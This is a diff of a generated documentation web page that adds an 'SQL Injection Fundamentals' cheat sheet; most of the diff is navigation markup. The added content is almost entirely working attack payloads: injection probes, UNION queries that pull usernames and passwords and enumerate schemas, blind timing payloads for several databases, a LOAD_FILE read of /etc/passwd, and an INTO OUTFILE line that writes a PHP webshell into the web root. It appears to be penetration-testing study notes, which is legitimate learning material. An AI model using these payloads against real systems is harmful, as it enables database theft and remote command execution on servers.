@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#sql-injection-fundamentals" class="md-skip">
           Skip to content
         </a>
       
@@ -1247,6 +1247,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1263,6 +1281,80 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#in-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#readwrite-files-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Read/Write Files (MySQL)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#comment-syntax-by-db" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comment Syntax by DB
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2933,69 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#in-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        In-Band SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#readwrite-files-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Read/Write Files (MySQL)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#comment-syntax-by-db" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comment Syntax by DB
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +3014,82 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="sql-injection-fundamentals">SQL Injection Fundamentals<a class="headerlink" href="#sql-injection-fundamentals" title="Permanent link">&para;</a></h1>
+<p>SQL injection allows attackers to manipulate backend SQL queries by injecting malicious input, leading to authentication bypass, data exfiltration, and sometimes RCE.</p>
+<h2 id="detection">Detection<a class="headerlink" href="#detection" title="Permanent link">&para;</a></h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">-- Basic test payloads</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="s1">&#39;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="s1">&#39;&#39;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="s1">`</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="s1">&#39;</span><span class="p">)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="err">&quot;</span><span class="p">))</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="s1">&#39; OR 1=1-- -</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<h2 id="in-band-sqli">In-Band SQLi<a class="headerlink" href="#in-band-sqli" title="Permanent link">&para;</a></h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">-- UNION-based: discover column count</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="s1">&#39; ORDER BY 1-- -   -- increase until error</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="c1">-- -</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="s1">&#39; UNION SELECT NULL,NULL-- -</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="s1">-- Find string columns</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">-- -</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1">-- Extract data</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="s1">&#39; UNION SELECT username,password,NULL FROM users-- -</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="s1">-- Extract DB info</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">version</span><span class="p">(),</span><span class="k">database</span><span class="p">(),</span><span class="k">user</span><span class="p">()</span><span class="c1">-- -</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c1">-- List tables</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="s1">&#39; UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="s1">-- List columns</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<h2 id="blind-sqli">Blind SQLi<a class="headerlink" href="#blind-sqli" title="Permanent link">&para;</a></h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">-- Boolean-based</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="s1">&#39; AND SUBSTRING((SELECT password FROM users WHERE username=&#39;</span><span class="k">admin</span><span class="s1">&#39;),1,1)=&#39;</span><span class="n">a</span><span class="s1">&#39;-- -</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="s1">-- Time-based</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="c1">-- -                    -- MySQL</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="s1">&#39;; WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">5</span><span class="s1">&#39;-- -          -- MSSQL</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="c1">-- - -- PostgreSQL</span>
+</span></code></pre></div>
+<h2 id="readwrite-files-mysql">Read/Write Files (MySQL)<a class="headerlink" href="#readwrite-files-mysql" title="Permanent link">&para;</a></h2>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">-- Read file</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="s1">&#39; UNION SELECT LOAD_FILE(&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s1">&#39;),NULL,NULL-- -</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="s1">-- Write webshell</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="c1">-- -</span>
+</span></code></pre></div>
+<h2 id="comment-syntax-by-db">Comment Syntax by DB<a class="headerlink" href="#comment-syntax-by-db" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>DB</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>-- -</code> <code>#</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>--</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>--</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>--</code></td>
+</tr>
+</tbody>
+</table>
 
 
 
